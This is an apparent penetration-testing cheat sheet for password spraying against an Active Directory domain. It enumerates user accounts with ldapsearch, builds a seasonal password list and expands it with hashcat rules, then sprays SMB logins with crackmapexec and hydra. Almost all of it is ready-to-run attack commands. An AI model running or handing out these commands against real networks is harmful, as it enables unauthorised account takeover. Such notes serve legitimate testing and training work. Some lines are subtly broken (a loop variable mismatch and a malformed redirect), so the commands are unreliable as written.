Prepare passwordspray:

    ldapsearch -h 10.10.10.10 -x -b "DC=whitehats,DC=local" '(objectClass=person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
    
We can remove some accounts from the list:
* Guest accounts
* Accounts ending with $ are machine accounts
* Generated exchange accounts (looking long and weird)

Creating custom password list:

    January
    February
    March
    April
    May
    June
    July
    Fall
    Spring
    Winter
    Summer
    Autumn
    P@ssw0rd
    Password
    ...
    
From custom list:

    for 1 in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
    
Hashcat can create some good list from this input:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule
    for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > with '!' 

For even more:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
    
Decrease password file:

    hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 8'
    
Password spraying:

    crackmapexec smb 10.10.10.10 -u userfilepath -p usrpwdpath
    hydra -L userlist.txt -P passwordlist.txt -t 10 -u -V 10.10.10.10 smb
